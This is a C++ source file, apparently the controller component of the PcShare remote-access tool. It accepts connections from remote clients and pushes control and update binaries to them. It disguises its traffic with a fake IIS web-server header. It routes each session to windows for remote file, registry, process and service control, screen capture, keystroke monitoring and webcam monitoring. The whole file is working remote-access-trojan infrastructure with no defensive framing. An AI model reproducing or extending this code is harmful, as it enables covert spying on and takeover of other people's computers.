#include "stdafx.h"
#include "PcShare.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern GOLBALVALUE m_MainValue;

//侦听线程
UINT WINAPI MyMainThread(LPVOID lPvoid)
{
	UINT		m_Id = 0;
	SOCKET		m_LisSocket = (SOCKET) lPvoid;
	SOCKET		m_AccSocket = 0;
	while(1)
	{
		//等待客户连接
		if((m_AccSocket = accept(m_LisSocket,0,0))	== INVALID_SOCKET) 
			break;

		//启动客户签到线程
		_beginthreadex(NULL,0,MyChildThread,(LPVOID) m_AccSocket,0,&m_Id);
	}
	closesocket(m_LisSocket);
	return 0;
}

bool SendKeepAlive(SOCKET s)
{
	char m_sCommand[512] = {0};
	char m_Strlen[256];
	strcpy(m_sCommand,"HTTP/1.1 200 OK\r\n");
	strcat(m_sCommand,"Server: Microsoft-IIS/5.0\r\n");
	CTime t = CTime::GetCurrentTime();
	sprintf(m_Strlen,"Date: %s GMT\r\n",
		t.FormatGmt ("%a, %d %b %Y %H:%M:%S"));
	strcat(m_sCommand,m_Strlen);
	sprintf(m_Strlen,"Content-Length: %d\r\n"
		,1024 * 1024 * 1024);
	strcat(m_sCommand,m_Strlen);
	strcat(m_sCommand,"Connection: Close\r\n");
	strcat(m_sCommand,"Cache-Control: no-cache\r\n\r\n");
	if(!SendData(s,m_sCommand,strlen(m_sCommand)))
	{
		closesocket(s);
		return false;
	}
	return true;
}

BOOL SendFile(SOCKET s, char* pFileName)
{
	FILE* fp = fopen(pFileName, "rb");
	if(fp == NULL)
	{
		closesocket(s);
		return FALSE;
	}
	fseek(fp,0,SEEK_END);
	int nLen = ftell(fp);
	fseek(fp,0,SEEK_SET);
	char* pFileBuf = new char[nLen];
	fread(pFileBuf, nLen, 1, fp);
	fclose(fp);
	if(	!SendData(s,(char*) &nLen,sizeof(int)) ||
		!SendData(s,pFileBuf,nLen))
	{
		delete [] pFileBuf;
		closesocket(s);
		return FALSE;
	}
	delete [] pFileBuf;
	return TRUE;
}

void LoginTrans(SOCKET s, LPCLIENTITEM pData)
{
	//回送确认包头信息
	if(!SendKeepAlive(s))
        return;

	//发送机器控制文件
	char m_FileName[512] = "PcCortr.dll";
	GetMyFilePath(m_FileName);
	if(!SendFile(s, m_FileName)) 
        return;

	//支持自动更新
	if(pData->m_SysInfo.m_PcName[61] == 1)
	{
		strcpy(m_FileName, "PcStat.exe");
		GetMyFilePath(m_FileName);
		if(!SendFile(s, m_FileName))
            return;

		strcpy(m_FileName, "PcClient.dll");
		GetMyFilePath(m_FileName);
		if(!SendFile(s, m_FileName)) 
            return;
	}
	
	//启动套接字关闭事件通知
	if(WSAAsyncSelect(s , m_MainValue.m_MainhWnd, WM_CLOSEITEM , FD_CLOSE) == SOCKET_ERROR)
	{
		closesocket(s);
		return ;
	}

	//填充客户信息
	sockaddr_in m_addr = {0};
	int	addrlen = sizeof(sockaddr_in);
	getpeername(s,(sockaddr*) &m_addr,&addrlen);
	char mTid[9] = {0};
	memcpy(mTid, pData->m_SysInfo.ID, 8);

	sprintf(pData->m_Title,"%03d.%03d.%03d.%03d:%s",
			m_addr.sin_addr.S_un.S_un_b.s_b1,
			m_addr.sin_addr.S_un.S_un_b.s_b2,
			m_addr.sin_addr.S_un.S_un_b.s_b3,
			m_addr.sin_addr.S_un.S_un_b.s_b4,
			mTid);
	CTime tLogin = CTime::GetCurrentTime();
	pData->m_LoginTime = (time_t) tLogin.GetTime();
	pData->m_WorkSocket = s;

	//通知主框架建立了连接
	if(!SendMessage(m_MainValue.m_MainhWnd , WM_ADDCLIENT, (WPARAM) pData , 0))
	{
		closesocket(s);
	}
}

void InterTrans(SOCKET s,LPCLIENTITEM pData , int ExecType)
{
	//定位窗口唯一标识
	sockaddr_in m_addr = {0};
	int	addrlen = sizeof(sockaddr_in);
	getpeername(s,(sockaddr*) &m_addr,&addrlen);
	char mTid[9] = {0};
	memcpy(mTid, pData->m_SysInfo.ID, 8);
	sprintf(pData->m_Title,"%03d.%03d.%03d.%03d:%s",
			m_addr.sin_addr.S_un.S_un_b.s_b1,
			m_addr.sin_addr.S_un.S_un_b.s_b2,
			m_addr.sin_addr.S_un.S_un_b.s_b3,
			m_addr.sin_addr.S_un.S_un_b.s_b4,
			mTid);
	
	//确定命令对应窗口
	char m_WndName[256] = {0};
	if(ExecType == CONN_FILE_UP || ExecType == CONN_FILE_DL)
	{
		//文件传输
		sprintf(m_WndName,"PCSHARE文件管理-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_MANA_SEND)
	{
		sprintf(m_WndName,"PCSHARE文件管理-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_MANA_RECV)
	{
		sprintf(m_WndName,"PCSHARE文件管理-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_FRAM_SEND)
	{
		sprintf(m_WndName,"PCSHARE屏幕监控-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_FRAM_RECV)
	{
		sprintf(m_WndName,"PCSHARE屏幕监控-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_TLNT_SEND)
	{
		sprintf(m_WndName,"PCSHARE超级终端-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_TLNT_RECV)
	{
		sprintf(m_WndName,"PCSHARE超级终端-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_REGD_SEND)
	{
		sprintf(m_WndName,"PCSHARE注册表管理-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_REGD_RECV)
	{
		sprintf(m_WndName,"PCSHARE注册表管理-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_PROC_SEND)
	{
		sprintf(m_WndName,"PCSHARE进程管理-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_PROC_RECV)
	{
		sprintf(m_WndName,"PCSHARE进程管理-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_SERV_SEND)
	{
		sprintf(m_WndName,"PCSHARE服务管理-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_SERV_RECV)
	{
		sprintf(m_WndName,"PCSHARE服务管理-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_KEYM_SEND)
	{
		sprintf(m_WndName,"PCSHARE键盘监控-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_KEYM_RECV)
	{
		sprintf(m_WndName,"PCSHARE键盘监控-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_MULT_SEND)
	{
		sprintf(m_WndName,"PCSHARE视频监控-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_MULT_RECV)
	{
		sprintf(m_WndName,"PCSHARE视频监控-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}

	Sleep(500);

	//查找窗口
	HWND hWnd = FindWindow(NULL,m_WndName);
	if(hWnd == NULL) 
	{
		Sleep(2000);
		hWnd = FindWindow(NULL,m_WndName);
		if(hWnd == NULL)
		{
			closesocket(s);
			return;
		}
	}

	//拷贝套接字
	DWORD pId = 0;
	GetWindowThreadProcessId(hWnd, &pId);
	WSAPROTOCOL_INFO m_SocketInfo = {0};
	if(WSADuplicateSocket(s, pId , &m_SocketInfo))
	{
		closesocket(s);
		return ;
	}
	
	//发送套接字到进程
	COPYDATASTRUCT ct = {0};
	ct.lpData = &m_SocketInfo;
	ct.cbData = sizeof(WSAPROTOCOL_INFO);
	ct.dwData = ExecType;
	SendMessage(hWnd,WM_COPYDATA,0,(LPARAM) &ct);
	closesocket(s);
}

//接收连接线程
UINT WINAPI MyChildThread(LPVOID lPvoid)
{
	//交易处理
	SOCKET s = (SOCKET) lPvoid;
	CLIENTITEM	m_ClientItem = {0};
	int nCmd = AcceptClientMain(s,&m_ClientItem);
	if(nCmd == -1) 
        closesocket(s);
	else if(nCmd == CONN_MAIN)
		LoginTrans(s,&m_ClientItem);
	else
		InterTrans(s, &m_ClientItem, nCmd);
	return 0;
}





